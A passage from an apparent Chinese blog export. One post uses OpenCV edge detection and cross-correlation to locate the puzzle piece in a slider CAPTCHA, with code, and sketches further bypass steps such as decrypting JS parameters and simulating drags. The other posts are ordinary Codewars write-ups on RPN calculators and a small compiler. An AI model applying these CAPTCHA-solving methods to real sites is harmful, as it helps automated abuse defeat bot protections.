<code>Canny边缘检测算子</code>（cv2.Canny）对背景图进行处理，凸显出拼图在图片中的边缘，具体代码如下：</li>\n</ul>\n<pre><code>  img_blur = cv2.GaussianBlur(img, (3, 3), 0)\n  img_gray = cv2.cvtColor(img_blur, cv2.COLOR_BGR2GRAY)\n  img_canny = cv2.Canny(img_gray, 100, 200)\n</code></pre>\n<ul>\n<li>用拼图轨迹算子在处理后的背景图上进行 <code>互相关操作</code>，所得最大（小）值的位置就是拼图在背景图中的坐标</li>\n</ul>\n<p>关于这个 <code>Canny</code> 边缘检测算子，我也小小的研究了一下，毕竟还是读了四年电工专业，没准还是以前上课学过的。推荐大家阅读这篇 <a href=\"http://www.opencv.org.cn/opencvdoc/2.3.2/html/doc/tutorials/imgproc/imgtrans/canny_detector/canny_detector.html\">Canny边缘检测的文章</a>，已经把算法的原理说得很清楚了。</p>\n<h4 id=\"\">其他思考</h4>\n<p>拼图的定位只是破解滑动验证码的一个中间环节，想要破解一个好的验证码产品除了定位拼图在整个图片中的位置外，可能还有以下几个问题需要考虑：</p>\n<ul>\n<li>从服务端获取的背景图可能是经过加密的（需要阅读js源码获得恢复图片的算法）</li>\n<li>返回给服务端的参数一般是经过加密处理的（需要阅读js源码理解算法）</li>\n<li>服务端可能会对用户滑动行为的移动轨迹对用户进行校验（可以尝试通过selenium等工具模拟拖动行为，或者积累真实的拖动数据后学习规律并通过js源码获得构造数据的算法）</li>\n</ul>\n<p>其实，我觉得对滑动轨迹的检测也是一个重点，但如果不是用第三方（比如极验之类）提供的实现，自己也比较难做好对轨迹的校验，前同事的这个就是自己实现的，不存在轨迹检测的问题，所以这里只讨论定位拼图位置这一点。</p>\n<p>所以总体的感觉是，拼图式滑动验证码的用户体验更好，但是从安全度上看，可能还不如传统的普通验证码。</p>\n<p>之前也考虑过是否可以尝试用深度学习的方法来达到目的，但如果用深度学习的方法来解决这个问题，将会有几个显著的问题需要面对。首先深度学习需要依赖大量的训练数据，这个条件不具备。其次，如果是以背景图上的坐标点作为输出结果来进行分类，因为点很多，训练难度会比较大。再有就是如果背景图发生变化，之前训练的模型也就失效了。综合以上因素，最终选择了边缘检测的方法来结局这个问题，突然感觉大学的专业课知识还是没有白学。不过毕竟是现炒现卖，还是比较肤浅，但是呢，至少目的还是达到了。</p>\n<p><img src=\"/content/images/2017/06/chat2.jpg\" alt=\"\"></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"63","plaintext":"在之前用神经网络的方法搞了一把前公司的验证码 [http://blog.chxj.name/crack-captcha]\n以后，前同事们也快速作出响应，迅速把普通验证码换成了滑动拼图验证码，然后还说：\n\n\n\n我觉得我可能是和验证码杠上了。\n\n滑动验证码拼图的定位问题只是破解过程中的一个环节，我的方案主要采用 opencv  提供的函数对图片进行处理后来实现定位，在这里只提供一个思路，抛砖引玉了。\n\n最终的实现效果可以通过 这个Demo [http://slide-captcha.chxj.name/] \n简单感受一下。相比之前用神经网络训练来破解普通验证码，这次的实现方式可能更具通用性，因为不用再依赖训练数据。\n\n  [http://slide-captcha.chxj.name/]\n\n关于滑动验证码\n演示项目所用到的滑动验证码实现相对简单，整个交互过程主要包含以下步骤：\n\n * 服务端将背景图片和拼图图片合并为一张图片，并记录下拼图在背景图中的x坐标，然后将拼好图片和单独的拼图图片返回给客户端\n * 客户端实现单片拼图在背景图上拖动的动画效果，并在用户完成拖动动作后，将当前拼图所处位置的坐标数据加密后返回给服务端\n * 服务端解密数据并比较客户端返回的x坐标数据并与之前保存的x坐标数据进行比较，允许小范围内的误差\n\n实现原理\n基于以上的验证码实现，本例子通过以下方式实现对验证码拼图在背景图中的定位（其他步骤较为简单，不做考虑）：\n\n * 利用opencv库中提供的边界查找函数(cv2.findContours)提取单片拼图边缘轨迹并构造成一个二维矩阵（算子），具体代码如下：\n\n shape = cv2.resize(cv2.imread('shape.png'), (shape_height, shape_width))\n shape_gray = cv2.cvtColor(shape, cv2.COLOR_BGR2GRAY)\n\n# 查找边界函数（findContours）要求先将图片转换为binary格式\n _, shape_binary = cv2.threshold(shape_gray, 127, 255, cv2.THRESH_BINARY)\n _, contours, hierarchy = cv2.findContours(shape_binary, cv2.RETR_TREE, cv2.CHAIN_APPROX_NONE)\n\n#所得到的contours是所有边界的列表，拼图图片中只会匹配到一个边界\ncontour = contours[0]\n\n# 边界数据是一个边界点所在坐标构成的列表\noperator = np.zeros((shape_height, shape_width))\n\n# 这里需要返回一个拼图边界的矩阵用来在背景图中做匹配\nfor point in contour:\n  operator[point[0][0]][point[0][1]] = 1\n\n\n\n * 利用 高斯模糊算子（cv2.GaussianBlur）和 Canny边缘检测算子\n   （cv2.Canny）对背景图进行处理，凸显出拼图在图片中的边缘，具体代码如下：\n\n  img_blur = cv2.GaussianBlur(img, (3, 3), 0)\n  img_gray = cv2.cvtColor(img_blur, cv2.COLOR_BGR2GRAY)\n  img_canny = cv2.Canny(img_gray, 100, 200)\n\n\n * 用拼图轨迹算子在处理后的背景图上进行 互相关操作，所得最大（小）值的位置就是拼图在背景图中的坐标\n\n关于这个 Canny  边缘检测算子，我也小小的研究了一下，毕竟还是读了四年电工专业，没准还是以前上课学过的。推荐大家阅读这篇 Canny边缘检测的文章\n[http://www.opencv.org.cn/opencvdoc/2.3.2/html/doc/tutorials/imgproc/imgtrans/canny_detector/canny_detector.html]\n，已经把算法的原理说得很清楚了。\n\n其他思考\n拼图的定位只是破解滑动验证码的一个中间环节，想要破解一个好的验证码产品除了定位拼图在整个图片中的位置外，可能还有以下几个问题需要考虑：\n\n * 从服务端获取的背景图可能是经过加密的（需要阅读js源码获得恢复图片的算法）\n * 返回给服务端的参数一般是经过加密处理的（需要阅读js源码理解算法）\n * 服务端可能会对用户滑动行为的移动轨迹对用户进行校验（可以尝试通过selenium等工具模拟拖动行为，或者积累真实的拖动数据后学习规律并通过js源码获得构造数据的算法）\n\n其实，我觉得对滑动轨迹的检测也是一个重点，但如果不是用第三方（比如极验之类）提供的实现，自己也比较难做好对轨迹的校验，前同事的这个就是自己实现的，不存在轨迹检测的问题，所以这里只讨论定位拼图位置这一点。\n\n所以总体的感觉是，拼图式滑动验证码的用户体验更好，但是从安全度上看，可能还不如传统的普通验证码。\n\n之前也考虑过是否可以尝试用深度学习的方法来达到目的，但如果用深度学习的方法来解决这个问题，将会有几个显著的问题需要面对。首先深度学习需要依赖大量的训练数据，这个条件不具备。其次，如果是以背景图上的坐标点作为输出结果来进行分类，因为点很多，训练难度会比较大。再有就是如果背景图发生变化，之前训练的模型也就失效了。综合以上因素，最终选择了边缘检测的方法来结局这个问题，突然感觉大学的专业课知识还是没有白学。不过毕竟是现炒现卖，还是比较肤浅，但是呢，至少目的还是达到了。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-06-30 09:04:10","updated_at":"2017-07-01 14:40:12","published_at":"2017-07-01 14:40:12","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e7e","uuid":"b33439f5-3e67-43e7-861c-2e87402ff502","title":"Codewars：从逆波兰表达式到Three-Pass编译器（1）","slug":"from-reverse-polish-notation-to-three-pass-compiler-1","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 最近沉迷于在 codewars 上做题无法自拔，其中有两道题我感觉挺有意思，觉得值得记下来，故成此文。\\n\\n第一道题的题面非常简单，实现一个包含 `+ - * /` 四则运算的计算器，输入样例：`1 + 2 * 3`， 期望结果 `7`。\\n\\n原题链接见下：\\n```\\nhttps://www.codewars.com/kata/calculator\\n```\\n\\n从小学数学的角度来思考这道题，答案是显而易见的：乘除法的优先级要高于加减法，所以我们可以把表达式中所有乘除法先提出来计算出结果并放回原来的位置，再依次计算加减法得到整个表达式的结果。依照这样的思路，我们可以有如下的代码实现（In Python）：\\n\\n```python\\nfrom operator import add, sub, mul, div\\n\\nFIRST = {'*' : mul, '/': div}\\nSECOND = {'+': add, '-': sub}\\n\\nclass Calculator(object):\\n    def evaluate(self, string):\\n        tokens = [float(t) if t.isdigit() or '.' in t else t for t in string.split()]\\n        while True:\\n            for (i, token) in enumerate(tokens):\\n                op = FIRST.get(token)\\n                if op:\\n                    tokens[i - 1 : i + 2] = [op(tokens[i - 1], tokens[i + 1])]\\n                    break\\n            else:\\n                ret = tokens[0]\\n                for i in xrange(1, len(tokens), 2):\\n                    ret = SECOND[tokens[i]](ret, tokens[i + 1])\\n                return ret\\n```\\n\\n或者，我们可以做得再优雅一点，先将表达式转化成一棵树：\\n\\n```\\n    +\\n   /  \\\\\\n  1    *\\n      / \\\\\\n     2   3\\n```\\n\\n然后再递归的从叶子开始求值，最后回到根，得出结果，这样，我们可以有如下实现：\\n\\n```python\\nfrom operator import sub, mul, add, div\\nfrom decimal import Decimal\\n\\nOPFUN = {\\\"+\\\": add, \\\"-\\\": sub, \\\"*\\\": mul, \\\"/\\\": div}\\n\\nclass Calculator(object):\\n    def eval_list(self, parts):\\n        for oplist in [[\\\"+\\\", \\\"-\\\"], [\\\"*\\\", \\\"/\\\"]]:\\n            for index in reversed(xrange(len(parts))):\\n                part = parts[index]\\n                if part in oplist:\\n                    return OPFUN[part](self.eval_list(parts[:index]), self.eval_list(parts[index+1:]))\\n\\n        if len(parts) == 1:\\n            return Decimal(parts[0])\\n\\n    def evaluate(self, string):\\n        return float(self.eval_list(string.split(\\\" \\\")))\\n```\\n\\n以上的实现方式都很棒，不过如果站在计算机的角度来思考这个问题，这样的实现方式显得有点不太自然。在第一种方式中，表达式的解析和运算是同时发生的，如果表达式很复杂，计算的速度会变慢；在第二种方式中，我们先将表达式转化成了一个树状结构，而对于一个比较复杂的表达式，树可能会很深，而且递归的过程将会消耗大量的内存，因此也不够理想。\\n\\n是否存在这样一种可能，设计一种十分简单的表达形式，计算机只需要只要按顺序依次读入并按某种规则进行计算就可以得出计算结果？答案是肯定的，这就是逆波兰表达式。\\n\\n来自维基百科：\\n```\\n逆波兰表示法（Reverse Polish notation，RPN，或逆波兰记法），是一种是由波兰数学家扬·武卡谢维奇1920年引入的数学表达式方式，在逆波兰记法中，所有操作符置于操作数的后面，因此也被称为后缀表示法。逆波兰记法不需要括号来标识操作符的优先级。\\n```\\n那么问题来了，我们要如何把一个普通的数学表达式（也叫`中缀表达式`）转换成逆波兰表达式的形式呢？维基百科上同样给出了答案，这就是 [调度场算法](https://zh.wikipedia.org/wiki/%E8%B0%83%E5%BA%A6%E5%9C%BA%E7%AE%97%E6%B3%95)。\\n\\n还是来自维基百科：\\n```\\n调度场算法（Shunting Yard Algorithm）是一个用于将中缀表达式转换为后缀表达式的经典算法，由艾兹格·迪杰斯特拉引入，因其操作类似于火车编组场而得名。\\n```\\n\\n这里我们给出一个包括括号的中缀表达式例子，值得注意的是，在逆波兰表达式的写法中，我们不再需要通过加括号的方式来指定表达式计算的优先级。\\n\\n![调度场算法](/content/images/2017/08/Screen-Shot-2017-08-24-at-3.52.32-PM.png)\\n\\n那么，对于表达式 `1+2*3` ，它的逆波兰表达式形式即为 `123*+`。不过知道怎么把我们熟悉的中缀表达式转换成逆波兰表达式仅仅是第一步，下面我们还需要知道如何对逆波兰表达式进行计算。那么，再看一个例子：\\n\\n![逆波兰表达式计算](/content/images/2017/08/Screen-Shot-2017-08-24-at-3.54.18-PM.png)\\n\\n现在，让我们再回到这道题，试试用逆波兰表达式的方式来得到答案。实现代码如下：\\n\\n```python\\nclass Calculator(object):\\n  def evaluate(self, string):\\n\\n      # 构造逆波兰表达式\\n      l = []\\n      operators = []\\n      for c in string.split(' '):\\n          if is_number(c):\\n              l.append(c)\\n          else:\\n              while len(operators) > 0:\\n                  if c in '*/' and operators[-1] in '+-':\\n                      break\\n                  else:\\n                      l.append(operators.pop())\\n              operators.append(c)\\n             \\n      # 计算逆波兰表达式\\n      stack = []\\n      for c in l + operators[::-1]:\\n          if is_number(c):\\n              stack.append(c)\\n          else:\\n              a = stack.pop()\\n              b = stack.pop()\\n              stack.append(str(eval(b + c + a))) \\n      return float(stack.pop()) \\n```\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>最近沉迷于在 codewars 上做题无法自拔，其中有两道题我感觉挺有意思，觉得值得记下来，故成此文。</p>\n</blockquote>\n<p>第一道题的题面非常简单，实现一个包含 <code>+ - * /</code> 四则运算的计算器，输入样例：<code>1 + 2 * 3</code>， 期望结果 <code>7</code>。</p>\n<p>原题链接见下：</p>\n<pre><code>https://www.codewars.com/kata/calculator\n</code></pre>\n<p>从小学数学的角度来思考这道题，答案是显而易见的：乘除法的优先级要高于加减法，所以我们可以把表达式中所有乘除法先提出来计算出结果并放回原来的位置，再依次计算加减法得到整个表达式的结果。依照这样的思路，我们可以有如下的代码实现（In Python）：</p>\n<pre><code class=\"language-python\">from operator import add, sub, mul, div\n\nFIRST = {'*' : mul, '/': div}\nSECOND = {'+': add, '-': sub}\n\nclass Calculator(object):\n    def evaluate(self, string):\n        tokens = [float(t) if t.isdigit() or '.' in t else t for t in string.split()]\n        while True:\n            for (i, token) in enumerate(tokens):\n                op = FIRST.get(token)\n                if op:\n                    tokens[i - 1 : i + 2] = [op(tokens[i - 1], tokens[i + 1])]\n                    break\n            else:\n                ret = tokens[0]\n                for i in xrange(1, len(tokens), 2):\n                    ret = SECOND[tokens[i]](ret, tokens[i + 1])\n                return ret\n</code></pre>\n<p>或者，我们可以做得再优雅一点，先将表达式转化成一棵树：</p>\n<pre><code>    +\n   /  \\\n  1    *\n      / \\\n     2   3\n</code></pre>\n<p>然后再递归的从叶子开始求值，最后回到根，得出结果，这样，我们可以有如下实现：</p>\n<pre><code class=\"language-python\">from operator import sub, mul, add, div\nfrom decimal import Decimal\n\nOPFUN = {&quot;+&quot;: add, &quot;-&quot;: sub, &quot;*&quot;: mul, &quot;/&quot;: div}\n\nclass Calculator(object):\n    def eval_list(self, parts):\n        for oplist in [[&quot;+&quot;, &quot;-&quot;], [&quot;*&quot;, &quot;/&quot;]]:\n            for index in reversed(xrange(len(parts))):\n                part = parts[index]\n                if part in oplist:\n                    return OPFUN[part](self.eval_list(parts[:index]), self.eval_list(parts[index+1:]))\n\n        if len(parts) == 1:\n            return Decimal(parts[0])\n\n    def evaluate(self, string):\n        return float(self.eval_list(string.split(&quot; &quot;)))\n</code></pre>\n<p>以上的实现方式都很棒，不过如果站在计算机的角度来思考这个问题，这样的实现方式显得有点不太自然。在第一种方式中，表达式的解析和运算是同时发生的，如果表达式很复杂，计算的速度会变慢；在第二种方式中，我们先将表达式转化成了一个树状结构，而对于一个比较复杂的表达式，树可能会很深，而且递归的过程将会消耗大量的内存，因此也不够理想。</p>\n<p>是否存在这样一种可能，设计一种十分简单的表达形式，计算机只需要只要按顺序依次读入并按某种规则进行计算就可以得出计算结果？答案是肯定的，这就是逆波兰表达式。</p>\n<p>来自维基百科：</p>\n<pre><code>逆波兰表示法（Reverse Polish notation，RPN，或逆波兰记法），是一种是由波兰数学家扬·武卡谢维奇1920年引入的数学表达式方式，在逆波兰记法中，所有操作符置于操作数的后面，因此也被称为后缀表示法。逆波兰记法不需要括号来标识操作符的优先级。\n</code></pre>\n<p>那么问题来了，我们要如何把一个普通的数学表达式（也叫<code>中缀表达式</code>）转换成逆波兰表达式的形式呢？维基百科上同样给出了答案，这就是 <a href=\"https://zh.wikipedia.org/wiki/%E8%B0%83%E5%BA%A6%E5%9C%BA%E7%AE%97%E6%B3%95\">调度场算法</a>。</p>\n<p>还是来自维基百科：</p>\n<pre><code>调度场算法（Shunting Yard Algorithm）是一个用于将中缀表达式转换为后缀表达式的经典算法，由艾兹格·迪杰斯特拉引入，因其操作类似于火车编组场而得名。\n</code></pre>\n<p>这里我们给出一个包括括号的中缀表达式例子，值得注意的是，在逆波兰表达式的写法中，我们不再需要通过加括号的方式来指定表达式计算的优先级。</p>\n<p><img src=\"/content/images/2017/08/Screen-Shot-2017-08-24-at-3.52.32-PM.png\" alt=\"调度场算法\"></p>\n<p>那么，对于表达式 <code>1+2*3</code> ，它的逆波兰表达式形式即为 <code>123*+</code>。不过知道怎么把我们熟悉的中缀表达式转换成逆波兰表达式仅仅是第一步，下面我们还需要知道如何对逆波兰表达式进行计算。那么，再看一个例子：</p>\n<p><img src=\"/content/images/2017/08/Screen-Shot-2017-08-24-at-3.54.18-PM.png\" alt=\"逆波兰表达式计算\"></p>\n<p>现在，让我们再回到这道题，试试用逆波兰表达式的方式来得到答案。实现代码如下：</p>\n<pre><code class=\"language-python\">class Calculator(object):\n  def evaluate(self, string):\n\n      # 构造逆波兰表达式\n      l = []\n      operators = []\n      for c in string.split(' '):\n          if is_number(c):\n              l.append(c)\n          else:\n              while len(operators) &gt; 0:\n                  if c in '*/' and operators[-1] in '+-':\n                      break\n                  else:\n                      l.append(operators.pop())\n              operators.append(c)\n             \n      # 计算逆波兰表达式\n      stack = []\n      for c in l + operators[::-1]:\n          if is_number(c):\n              stack.append(c)\n          else:\n              a = stack.pop()\n              b = stack.pop()\n              stack.append(str(eval(b + c + a))) \n      return float(stack.pop()) \n</code></pre>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"64","plaintext":"> 最近沉迷于在 codewars 上做题无法自拔，其中有两道题我感觉挺有意思，觉得值得记下来，故成此文。\n\n\n第一道题的题面非常简单，实现一个包含 + - * /  四则运算的计算器，输入样例：1 + 2 * 3， 期望结果 7。\n\n原题链接见下：\n\nhttps://www.codewars.com/kata/calculator\n\n\n从小学数学的角度来思考这道题，答案是显而易见的：乘除法的优先级要高于加减法，所以我们可以把表达式中所有乘除法先提出来计算出结果并放回原来的位置，再依次计算加减法得到整个表达式的结果。依照这样的思路，我们可以有如下的代码实现（In\nPython）：\n\nfrom operator import add, sub, mul, div\n\nFIRST = {'*' : mul, '/': div}\nSECOND = {'+': add, '-': sub}\n\nclass Calculator(object):\n    def evaluate(self, string):\n        tokens = [float(t) if t.isdigit() or '.' in t else t for t in string.split()]\n        while True:\n            for (i, token) in enumerate(tokens):\n                op = FIRST.get(token)\n                if op:\n                    tokens[i - 1 : i + 2] = [op(tokens[i - 1], tokens[i + 1])]\n                    break\n            else:\n                ret = tokens[0]\n                for i in xrange(1, len(tokens), 2):\n                    ret = SECOND[tokens[i]](ret, tokens[i + 1])\n                return ret\n\n\n或者，我们可以做得再优雅一点，先将表达式转化成一棵树：\n\n    +\n   /  \\\n  1    *\n      / \\\n     2   3\n\n\n然后再递归的从叶子开始求值，最后回到根，得出结果，这样，我们可以有如下实现：\n\nfrom operator import sub, mul, add, div\nfrom decimal import Decimal\n\nOPFUN = {\"+\": add, \"-\": sub, \"*\": mul, \"/\": div}\n\nclass Calculator(object):\n    def eval_list(self, parts):\n        for oplist in [[\"+\", \"-\"], [\"*\", \"/\"]]:\n            for index in reversed(xrange(len(parts))):\n                part = parts[index]\n                if part in oplist:\n                    return OPFUN[part](self.eval_list(parts[:index]), self.eval_list(parts[index+1:]))\n\n        if len(parts) == 1:\n            return Decimal(parts[0])\n\n    def evaluate(self, string):\n        return float(self.eval_list(string.split(\" \")))\n\n\n以上的实现方式都很棒，不过如果站在计算机的角度来思考这个问题，这样的实现方式显得有点不太自然。在第一种方式中，表达式的解析和运算是同时发生的，如果表达式很复杂，计算的速度会变慢；在第二种方式中，我们先将表达式转化成了一个树状结构，而对于一个比较复杂的表达式，树可能会很深，而且递归的过程将会消耗大量的内存，因此也不够理想。\n\n是否存在这样一种可能，设计一种十分简单的表达形式，计算机只需要只要按顺序依次读入并按某种规则进行计算就可以得出计算结果？答案是肯定的，这就是逆波兰表达式。\n\n来自维基百科：\n\n逆波兰表示法（Reverse Polish notation，RPN，或逆波兰记法），是一种是由波兰数学家扬·武卡谢维奇1920年引入的数学表达式方式，在逆波兰记法中，所有操作符置于操作数的后面，因此也被称为后缀表示法。逆波兰记法不需要括号来标识操作符的优先级。\n\n\n那么问题来了，我们要如何把一个普通的数学表达式（也叫中缀表达式）转换成逆波兰表达式的形式呢？维基百科上同样给出了答案，这就是 调度场算法\n[https://zh.wikipedia.org/wiki/%E8%B0%83%E5%BA%A6%E5%9C%BA%E7%AE%97%E6%B3%95]。\n\n还是来自维基百科：\n\n调度场算法（Shunting Yard Algorithm）是一个用于将中缀表达式转换为后缀表达式的经典算法，由艾兹格·迪杰斯特拉引入，因其操作类似于火车编组场而得名。\n\n\n这里我们给出一个包括括号的中缀表达式例子，值得注意的是，在逆波兰表达式的写法中，我们不再需要通过加括号的方式来指定表达式计算的优先级。\n\n\n\n那么，对于表达式 1+2*3  ，它的逆波兰表达式形式即为 123*+\n。不过知道怎么把我们熟悉的中缀表达式转换成逆波兰表达式仅仅是第一步，下面我们还需要知道如何对逆波兰表达式进行计算。那么，再看一个例子：\n\n\n\n现在，让我们再回到这道题，试试用逆波兰表达式的方式来得到答案。实现代码如下：\n\nclass Calculator(object):\n  def evaluate(self, string):\n\n      # 构造逆波兰表达式\n      l = []\n      operators = []\n      for c in string.split(' '):\n          if is_number(c):\n              l.append(c)\n          else:\n              while len(operators) > 0:\n                  if c in '*/' and operators[-1] in '+-':\n                      break\n                  else:\n                      l.append(operators.pop())\n              operators.append(c)\n             \n      # 计算逆波兰表达式\n      stack = []\n      for c in l + operators[::-1]:\n          if is_number(c):\n              stack.append(c)\n          else:\n              a = stack.pop()\n              b = stack.pop()\n              stack.append(str(eval(b + c + a))) \n      return float(stack.pop())","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-08-22 13:36:32","updated_at":"2017-08-24 09:03:07","published_at":"2017-08-24 08:07:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e7f","uuid":"6c77edec-4285-4af7-8179-7d1e099f3b42","title":"Codewars：从逆波兰表达式到Three-Pass编译器（2）","slug":"from-reverse-polish-notation-to-three-pass-compiler-2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"在这里我想说的第二道题，我把它理解成一次对逆波兰表达式的运用和延伸。关于逆波兰表达式的相关知识，可以在前一篇博客中读到 ：\\n[Codewars：从逆波兰表达式到Three-Pass编译器（1）](http://blog.chxj.name/from-reverse-polish-notation-to-three-pass-compiler-1/) \\n\\n和前一题相比，这道题的题面就要复杂多了。\\n\\n我们有一种如下的语法规则的编程语言：\\n\\n```\\n [ a b ] a*a + b*b\\n```\\n这里我们定义了一个函数，这个函数有两个参数（a 和 b），函数功能是计算 a 和 b 的平方和。\\n\\n现在，请为该语言实现一个简单的语法编译器。编译过程可以拆分为三个步骤：\\n\\n1.将函数解析为一个抽象语法树（[AST](https://zh.wikipedia.org/zh-hans/%E6%8A%BD%E8%B1%A1%E8%AA%9E%E6%B3%95%E6%A8%B9) ）\\n  \\n  AST有如下规则：\\n\\n```\\n    { 'op': '+', 'a': a, 'b': b }    // add subtree a to subtree b\\n    { 'op': '-', 'a': a, 'b': b }    // subtract subtree b from subtree a\\n    { 'op': '*', 'a': a, 'b': b }    // multiply subtree a by subtree b\\n    { 'op': '/', 'a': a, 'b': b }    // divide subtree a from subtree b\\n    { 'op': 'arg', 'n': n }          // reference to n-th argument, n integer\\n    { 'op': 'imm', 'n': n }          // immediate value n, n integer\\n```\\n\\n   那么， 例如 `[ x y ] ( x + y ) / 2` 这样的一个函数，我们需要将其解析为如下结构：\\n\\n```\\n { 'op': '/', 'a': { 'op': '+', 'a': { 'op': 'arg', 'n': 0 },\\n                                   'b': { 'op': 'arg', 'n': 1 } },\\n                 'b': { 'op': 'imm', 'n': 2 } }\\n```\\n\\n2.优化AST，提前计算其中可以计算的项， 比如 `[ x ] x + 2*5` 这个函数，在经过第二步的优化后，将转化为如下结构：\\n\\n```\\n   { 'op': '+', 'a': { 'op': 'arg', 'n': 0 },\\n                 'b': { 'op': 'imm', 'n': 10 } }\\n```\\n\\n3.第三步则是将优化后的AST转化为类似汇编语言的底层代码，具体规则如下：\\n```\\n    \\\"IM n\\\"     // load the constant value n into R0\\n    \\\"AR n\\\"     // load the n-th input argument into R0\\n    \\\"SW\\\"       // swap R0 and R1\\n    \\\"PU\\\"       // push R0 onto the stack\\n    \\\"PO\\\"       // pop the top value off of the stack into R0\\n    \\\"AD\\\"       // add R1 to R0 and put the result in R0\\n    \\\"SU\\\"       // subtract R1 from R0 and put the result in R0\\n    \\\"MU\\\"       // multiply R0 by R1 and put the result in R0\\n    \\\"DI\\\"       // divide R0 by R1 and put the result in R0\\n```\\n那么，上面的例子经过转化后，一种可能的形式是： `[ \\\"IM 10\\\", \\\"SW\\\", \\\"AR 0\\\", \\\"AD\\\" ]` 。因为解析算法的不同，第三步得到的指令列表可能不尽相同，但只要最后的执行结果正确即可。\\n\\n转换成以上形式后，题目提供了以下函数来执行这个指令列表：\\n\\n```\\ndef simulate(asm, argv):\\n    r0, r1 = None, None\\n    stack = []\\n    for ins in asm:\\n        if ins[:2] == 'IM' or ins[:2] == 'AR':\\n            ins, n = ins[:2], int(ins[2:])\\n        if ins == 'IM':   r0 = n\\n        elif ins == 'AR': r0 = argv[n]\\n        elif ins == 'SW': r0, r1 = r1, r0\\n        elif ins == 'PU': stack.append(r0)\\n        elif ins == 'PO': r0 = stack.pop()\\n        elif ins == 'AD': r0 += r1\\n        elif ins == 'SU': r0 -= r1\\n        elif ins == 'MU': r0 *= r1\\n        elif ins == 'DI': r0 /= r1\\n    return r0\\n```\\n最后返回计算结果。\\n\\n原题地址 ：\\n```\\nhttps://www.codewars.com/kata/tiny-three-pass-compiler/train/python\\n```\\n\\n对于我这样不是科班出身也没学过编译原理这门课的程序员，解这道题的整个过程可以说是一次非常棒的实验课。这不正是编译器将一门高级编程语言编译成汇编代码的一个生动的例子吗！\\n\\n幸好有了上一篇逆波兰表达式的基础，这道也变得不是那么的无从下手了，下面就讲讲我的思路：\\n\\n第一步，首先需要对题目语言中的符号进行处理，比如 `[]` 表示函数的形参。 之后要处理的就是函数体中的表达式，我的思路是先将表达式转换逆波兰表达式，再使用计算逆波兰表达式的方法，构造AST。\\n\\n第二步，递归遍历这棵树，计算其中两个节点均为标量的部分。\\n\\n第三步，递归遍历优化后的AST，得到指令列表。\\n\\n\\n最后就是具体的实现代码了 ：\\n\\n```python\\nimport re\\n\\nclass Compiler(object):\\n\\n    def compile(self, program):\\n        return self.pass3(self.pass2(self.pass1(program)))\\n        \\n    def tokenize(self, program):\\n        \\\"\\\"\\\"Turn a program string into an array of tokens.  Each token\\n           is either '[', ']', '(', ')', '+', '-', '*', '/', a variable\\n           name or a number (as a string)\\\"\\\"\\\"\\n        token_iter = (m.group(0) for m in re.finditer(r'[-+*/()[\\\\]]|[A-Za-z]+|\\\\d+', program))\\n        return [tok for tok in token_iter]\\n\\n    def pass1(self, program):\\n        tokens = self.tokenize(program)\\n        args = []\\n        list = []\\n        operators = []\\n        arg = False\\n        for t in tokens:\\n            if t == '[':\\n                arg = True\\n                continue\\n                \\n            if t == ']':\\n                arg = False\\n                continue\\n                \\n            if arg:\\n                args.append(t)\\n                continue\\n                \\n            if t in '+-*/':\\n                while(len(operators) != 0):\\n                    if operators[-1] != '(' and not (t in '*/' and operators[-1] in '+-'):\\n                        list.append(operators.pop())\\n                    else:\\n                        break\\n                operators.append(t)\\n            elif t == '(':\\n                operators.append(t)\\n            elif t == ')':\\n                while True:\\n                    x = operators.pop()\\n                    if x != '(' :\\n                        list.append(x)\\n                    else:\\n                        break\\n            else:\\n                list.append(t)\\n        \\n        stack = []\\n        for x in list + operators[::-1]:\\n            if x not in '+-*/':\\n                stack.append(x)\\n            else:\\n                b = self.build_val(stack.pop(), args)\\n                a = self.build_val(stack.pop(), args)\\n                stack.append({'op': x, 'a': a, 'b': b})\\n        \\n        return stack.pop()\\n        \\n    def build_val(self, val, args):\\n        if type(val) is dict:\\n            return val\\n        elif val in args:\\n            return {'op': 'arg', 'n': args.index(val)}\\n        elif val.isdigit():\\n            return {'op': 'imm', 'n': int(val)}\\n        \\n    def pass2(self, ast):\\n        if ast['op'] in '+-*/':\\n            if ast['a']['op'] in '+-*/':\\n                ast['a'] = self.pass2(ast['a'])\\n            if ast['b']['op'] in '+-*/':\\n                ast['b'] = self.pass2(ast['b'])\\n            if ast['a']['op'] == 'imm' and ast['b']['op'] == 'imm':\\n                ast = {'op': 'imm', 'n': eval(str(ast['a']['n']) + ast['op'] + str(ast['b']['n']))}\\n        \\n        return ast                \\n\\n    def pass3(self, ast):\\n        op_dict = {\\n            '+': 'AD',\\n            '-': 'SU',\\n            '*': 'MU',\\n            '/': 'DI',\\n        }\\n        if ast['op'] in '+-*/':\\n            return (self.pass3(ast['a']) + self.pass3(ast['b'])) + ['PO', 'SW', 'PO', op_dict.get(ast['op']), 'PU']\\n        elif ast['op'] == 'arg':\\n            return ['AR ' + str(ast['n']), 'PU']\\n        elif ast['op'] == 'imm':\\n            return ['IM ' + str(ast['n']), 'PU']\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>在这里我想说的第二道题，我把它理解成一次对逆波兰表达式的运用和延伸。关于逆波兰表达式的相关知识，可以在前一篇博客中读到 ：<br>\n<a 